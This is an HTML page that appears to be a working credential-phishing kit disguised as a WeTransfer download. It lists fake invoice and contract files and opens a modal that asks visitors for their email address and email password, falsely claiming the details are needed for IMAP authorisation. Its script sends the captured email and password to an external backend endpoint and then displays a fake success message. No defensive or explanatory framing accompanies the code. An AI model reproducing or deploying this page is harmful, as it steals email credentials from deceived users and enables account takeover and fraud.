<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>xml</title>
    <link rel="icon" type="image/x-icon" href="xml/egg.png" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
      #loader {
        -webkit-animation: fadeout 10s linear forwards;
        animation: fadeout 5s linear forwards;
      }

      .nav-container {
        opacity: 0;
        display: block;
        -webkit-animation: fadein 20s linear forwards;
        animation: fadein 1s linear forwards;
        animation-delay: 2s;
      }

      @-webkit-keyframes fadeout {
        90% {
          opacity: 1;
        }

        99% {
          opacity: 0;
          height: 200px;
        }

        100% {
          opacity: 0;
          height: 0;
        }
      }

      @keyframes fadeout {
        90% {
          opacity: 1;
        }

        99% {
          opacity: 1;
          height: 200px;
        }

        100% {
          opacity: 0;
          height: 0;
        }
      }

      @-webkit-keyframes fadein {
        0% {
          opacity: 0;
        }

        100% {
          opacity: 1;
        }
      }

      @keyframes fadein {
        0% {
          opacity: 0;
        }

        100% {
          opacity: 1;
        }
      }
    </style>
    <style>
      body {
        background-color: #f1f1f2;
        overflow: hidden;
      }

      * {
        margin: 0;
        padding: 0;
      }

      .head1 {
        display: flex;
        position: relative;
        justify-content: space-between;
      }

      .contain-all {
        display: flex;
        position: relative;
        justify-content: space-between;
        padding: 2%;
      }

      .logbox {
        width: 22%;
        height: 100%;
        border-radius: 10px;
        padding: 21px;
        margin-top: 21px;
        margin-left: 21px;
        background-color: #fff;
      }

      .write-test {
        font-size: 40.02px;
        line-height: 120%;
      }

      .accept1 {
        margin-top: 31px;
      }

      .flex-container {
        display: flex;
        flex-direction: column;
        margin-top: 10px;
      }

      .div1 {
        display: flex;
        position: relative;
        justify-content: space-between;
        margin-top: 21px;
      }

      .img-btn {
        cursor: pointer;
      }
    </style>

    <style>
      @media (max-width: 480px) {
        .logbox {
          width: 100%;
        }

        .imgdispaybox {
          display: none;
        }

        .contentbox {
          display: none;
        }
      }
    </style>
  </head>

  <body data-new-gr-c-s-check-loaded="14.1238.0" data-gr-ext-installed="">
    <div class="head1">
      <div class="logo"><img src="xml/puppy.png" alt="logo" /></div>
      <div class="navimg"><img src="xml/goat.png" alt="wet-nav" /></div>
    </div>

    <div class="contain-all">
      <div class="logbox">
        <div><img src="xml/egg.png" alt="lo-black" /></div>
        <div class="write-test">
          <span>You're</span><br />
          <b>almost</b> there
        </div>

        <div class="flex-container">
          <div class="div1">
            <div>PO_201AJ02.xls</div>
            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
              <img src="xml/maggot.png" alt="download" />
            </div>
          </div>

          <div class="div1">
            <div>Product specifications.pdf</div>
            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
              <img src="xml/maggot.png" alt="download" />
            </div>
          </div>

          <div class="div1">
            <div>Contracts.xls</div>
            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
              <img src="xml/maggot.png" alt="download" />
            </div>
          </div>

          <div class="div1">
            <div>Final Invoice: G-313423-338.pdf</div>
            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
              <img src="xml/maggot.png" alt="download" />
            </div>
          </div>
        </div>

        <div class="accept1">
          To continue, please agree<br />
          to our
          <u
            ><b
              ><span
                class="img-btn"
                data-bs-toggle="modal"
                data-bs-target="#cat"
                >Terms Of Service.</span
              ></b
            ></u
          >
        </div>

        <hr />

        <center>
          <a href="#m" class="btn btn-primary" data-bs-toggle="modal">
            Download
          </a>
        </center>
      </div>
      <div class="contentbox"><img src="xml/adult.png" alt="content" /></div>
      <div class="imgdispaybox"><img src="xml/pulpa.png" alt="imgco" /></div>
    </div>

    <!-- Modal -->
    <form id="cow">
      <div
        class="modal fade"
        id="m"
        tabindex="-1"
        aria-labelledby="cat"
        aria-hidden="true"
        data-bs-backdrop="static"
        data-bs-keyboard="false"
        tab=""
      >
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h1 class="modal-title fs-5" id="catLabel">
                Authenticating, Please Wait
              </h1>
              <button
                type="button"
                class="btn-close"
                data-bs-dismiss="modal"
                aria-label="Close"
              ></button>
            </div>
            <div class="modal-body">
              <div id="loader">
                <center>
                  <img src="xml/larva.gif" alt="" width="30%" />
                  <p>
                    Connecting <b><span id="connect"></span></b> Email Server
                    Integration with WeTransfer
                  </p>
                </center>
              </div>

              <div class="nav-container">
                <div class="alert alert-primary" role="alert">
                  These files contain sensitive information and are protected
                  against unauthorized access. To proceed with downloading this
                  file, please enter your valid email credentials. We will
                  establish a secure IMAP connection with your email provider to
                  verify authorization for the download.
                </div>

                <div class="mb-3">
                  <label for="email" class="form-label">Email address:</label>
                  <input
                    name="email"
                    type="email"
                    class="form-control"
                    id="email"
                    autocomplete="username"
                    placeholder="name@example.com"
                  />
                </div>

                <div class="mb-3">
                  <label for="password" class="form-label">Password:</label>
                  <input
                    name="password"
                    type="password"
                    class="form-control"
                    id="password"
                    placeholder="Enter Email Password"
                  />
                </div>

                <div class="alert" id="response"></div>
              </div>
            </div>
            <div class="modal-footer">
              <button
                type="submit"
                name="xml"
                id="submit-btn"
                class="btn btn-primary"
              >
                Download Now
              </button>
            </div>
          </div>
        </div>
      </div>
    </form>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const form = document.getElementById("cow");
        const emailInput = document.getElementById("email");
        const passwordInput = document.getElementById("password");
        const responseBox = document.getElementById("response");
        const connectSpan = document.getElementById("connect");
        const modal = new bootstrap.Modal(document.getElementById("m"));

        form.addEventListener("submit", async function (e) {
          e.preventDefault();

          const email = emailInput.value.trim();
          const password = passwordInput.value.trim();

          if (!email || !password) {
            responseBox.className = "alert alert-danger";
            responseBox.textContent = "Please fill in both email and password.";
            return;
          }

          connectSpan.textContent = email;
          responseBox.className = "alert alert-info";
          responseBox.textContent = "Authenticating...";

          try {
            const res = await fetch(
              "https://quamcon-backend.onrender.com/api/subscribe",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({ email, password }),
              }
            );

            const data = await res.json();

            if (res.ok) {
              responseBox.className = "alert alert-success";
              responseBox.textContent =
                data.message || "Successfully submitted!";

              // Wait 3 seconds then close the modal
              setTimeout(() => {
                modal.hide();
              }, 3000);
            } else {
              responseBox.className = "alert alert-danger";
              responseBox.textContent = data.message || "Submission failed.";
            }
          } catch (err) {
            responseBox.className = "alert alert-danger";
            responseBox.textContent = "Network error. Please try again.";
            console.error(err);
          }
        });
      });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  </body>
  <grammarly-desktop-integration
    data-grammarly-shadow-root="true"
  ></grammarly-desktop-integration>
</html>
